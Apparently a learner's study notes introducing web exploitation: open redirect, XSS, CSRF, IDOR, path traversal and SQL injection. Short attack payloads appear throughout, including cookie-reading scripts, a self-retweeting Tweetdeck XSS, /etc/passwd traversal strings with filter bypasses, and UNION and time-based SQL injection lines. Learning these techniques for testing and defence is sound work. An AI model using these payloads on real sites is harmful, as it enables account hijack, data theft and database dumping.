# Intro to Web Exploitation

## Open redirect

Takes user input to redirect the client from its page to another, usually
controlled by the attacker. Low impact unless used with other vulnerabilities
to escalate. Sometimes the application has security measures to prevent user
from inputting disallowed websites, but bypass is possible; look below.

```
// Allowed
https://example.com/login/?nextPage=https://google.com

// Not allowed
https://example.com/login/?nextPage=https://attackerSite.com

// Allowed
https://example.com/login?nextPage=https://evilsite.com/?google.com
```

## Open redirect lab

This redirects to link after '@'
```
https://google.com@yahoo.com
```

## XSS

Used to execute arbitrary code on client's browser, uses:
1. Phishing
1. Dumping data
1. Account hijack

Attacker injects malicious code onto the website, clients click on link or
visit the website url then the malicious script is executed on their browser.
Executed malicious code is static and predefined. Payload had privilege that
the user has, if admin account then even higher impact.

Impact:
1. XSS medium
1. Stored XSS high-\>critical

* Reflected XSS: Payload injected from user clicking link
* Stored XSS: Payload is stored server side, user visits the link and payload
  is pulled from db
* DOM XSS: Javascript reflected from user source to function

Reflected Example:
```
example.com/page?name=ASH	 ->	Hello, ASH (Normal)
example.com/page?name=<u>ASH</u> ->	Hello, <u>ASH</u> (No XSS)
example.com/page?name=<u>ASH</u> ->	Hello, __ASH__ (Possible XSS)
```

Stored Example:
```HTML
// Tweetdeck
<script
class="xss">$('.xss').parents().eq(1).find('a').
eq(1).click();$('[data-
action=retweet]').click();alert('XSS in
Tweetdeck')</script>
```

DOM Example:
```
https://example.com/#send-transaction<div/class="header__wrap"><a/href
=javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif>
</div>
```

## XSS lab

Simple test for XSS:
```
<u>test</u>
<script>alert(document.cookie)</script>
```

More complex example: (If inside tag 'input' for example)
```
"</input><script>alert(1)</script>
```

Another example: Output as a title or somewhere else
```
</title><script>alert()</script>
```

Interesting example: If input is sanitized somewhat
```
// Original code: var name = 'asd';
';+alert(1);//commentOut
```

## CSRF

Force client-side action without them user knowing that somethign happened.
There is no data being lost, but only an action being done. Example below 
shows how an attacker can submit a post request to /change-email which will
change the users email without them knowing.

Example: Post request
```HTML
<form action="change-email", method="POST">
	<label for="email">new email:</label>
	<input type="email" name="new_email">
	<button type="submit"submit</button>>
</form>
```

Example: Get request
```
<img/src="http://crypto.com/buy.php?wallet=something&amount=100&type=btc">
```

Get request above is similar, user visits a link with that in the source code
then action will happen without them knowing. Some websites have csrf tokens
for security but you may be able to remove token, and attack due to that token
not actually being used for anything. Another mistake is that websites may have
tokens but all users but you can copy a token from one user to another making it
seem like you are the user.

## IDOR

Accessing of objects that should not be allowed, so leaking information from
other users for example. Example:
```
https://example.com/api/user/1235/address
```

Changing user id will give data of that user, leaking information of any user
supplied by attacker. Sometimes ID is encrypted so not easy to locate. Sometimes
the id is not leaking through the url but through http headers:

```
{
	"id": 	      11234,
	"username:" : "admin",
	"email":      "admin@web.com"
}

Response:
{"success": true}
```

Understanding infrastructure is required for IDOR:
1. How does data get fetched?
1. How do you create new data?
1. How do you modify data?

Tasks:
1. Look for numerical ID in requests and headers
1. Creating multiple users and identifying differences:
 1. userID
 1. objectID
 1. Sessions?
1. Deobfuscate id's if needed

Leak sources:
1. User profiles
1. User avatar url `/assets/profile_picture/1235sadf-3k4/avatar.png`

## Local File Disclosure

Allows user to fetch files on local machine, thus reading configuration files
or any arbitrary files on the machine (/etc/passwd). This is an information
disclosure.

```
GET http://bank.com/view_file?image=/images/avatar.jpg
GET http://bank.com/view_file?image=../../../etc/passwd
```

First get request above is normal url that website may link to, if attacker can
input any file in the url then they are able to read files on the local host
that's hosting all these files. Sometimes need to URL encode, different other
encoding. How the host machine is configured matters a lot, different configured
machines may have different paths to files (not /etc/passwd).

```
GET http://bank.com/transaction?u=randomusername
GET http://bank.com/transaction?u=/../../../etc/passwd?%00
```

Sometimes backend application expects a certain extension, so may need to play
around setting nulllbyte, question mark or other things. Filtering may be
present, besides url encoding can try things like `..././` or `....//` those
both equal `../`. Best to automate and fuzz for this.

## SQL Injection

SQL is language to communicate with database (mysql or others), attackers can
inject sql statements that allow them to read, create or modify table entries.
This would normally be prevented via some sort of input validation.

### Error-based (older):
1. Error is given back to the user due to invalid syntax
1. This gives information to attacker as to how backend is structured

```
/app/news.php?id=1
/app/news.php?id=1'
/app/news.php?id=1'+UNION+SELECT+1,2,3--+
```

Line 1 is normal input, fetching id 1 of news id parameter. Line 2 will throw
error due to invalid syntax, which we will use to understand more about the
backend. Does it throw out error? What error? Is it vulnerable to sqli? Third
is injection to select id 1 and more stuff which the attacker might want. This
essentially leaks the database.

Attacker essentially will just guess and try different injections to try dump
the entire database if possible, given context (news here) we can try accessing
articles, title, names, and more.

```
/app/news.php?id=1'+UNION+SELECT+1,title,3--+
/app/news.php?id=1'+UNION+SELECT+1,2,3,4 from table2--+
```

First line dumps another column, title if it does exist. Otherwise it will
show an error so bruteforcing given context is needed. Attackers can also try
to access different tables from the same database (line 2). Depending on
response you might be able to dump more tables.

### Blind sql injection

Relying on if a condition is true or not, if it is true then it will allow
access to whatever you are trying to access.

```
?id=1" AND 1=1--
1'; AND sleep(5)--
'; WAITFOR DELAY '0:0:5'--
?id=1' AND substring(@@version,1,1)=5
```

Different ways to try see if a blind sql injection works. Last one tries to
bruteforce the version number of sql backend.
